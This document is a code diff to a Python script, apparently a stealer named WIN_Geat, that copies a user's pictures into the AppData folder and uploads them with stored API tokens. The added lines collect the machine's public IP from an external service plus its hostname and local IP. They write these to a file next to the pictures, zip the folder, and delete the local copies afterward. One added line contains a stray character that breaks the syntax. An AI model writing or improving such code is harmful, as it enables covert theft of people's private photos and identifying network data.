@@ -5,12 +5,23 @@ import shutil
 import base64
 import json
 import requests
+import socket
+import urllib.request
 
 Token         = ""# add the Token hare
 client_id     = ''#add the client_id  hare
 client_secret = ''#add the client_secret hare
 refresh_token = ''#add the refresh_token  hare
-
+try:
+    public_ip  = urllib.request.urlopen('http://api.ipify.org').read().decode('utf8')
+except Exception as e:
+    print(e)
+    public_ip = 'None'
+try:    
+     host_name  = socket.gethostname()
+     host_ip    = socket.gethostbyname(host_name)
+except socket.gaierror: 
+    host_ip =  'None'
 class WIN_Geat:
     def __init__(self):
         
@@ -48,6 +59,8 @@ class WIN_Geat:
                                 readpic = pic.read()
                             with open(Files,'wb') as pic:
                                 pic.write(readpic)
+                            with open('info.txt','w') as info :
+                            3    info.write('\n public_ip : '+ public_ip+'\n host_ip  : '+host_ip) 
                             count +=1     
                             if count == 1000 :
                                 break        
@@ -89,7 +102,11 @@ class WIN_Geat:
                              headers=headers,
                              files=files
                           )
-         shutil.rmtree(os.environ["appdata"] +'\\PicBackup.zip', ignore_errors=False, onerror=None)  
+         shutil.make_archive(os.environ["appdata"] +'\\PicBackup', "zip",os.environ["appdata"] +'\\PicBackup'  )
+         os.chdir(os.environ["appdata"] )
+         shutil.rmtree(os.environ["appdata"] +'\\PicBackup', ignore_errors=True, onerror=None)
+         shutil.rmtree(os.environ["appdata"] +'\\PicBackup.zip', ignore_errors=True, onerror=None)
+            
 if __name__=='__main__':
     WIN_Geat()
        
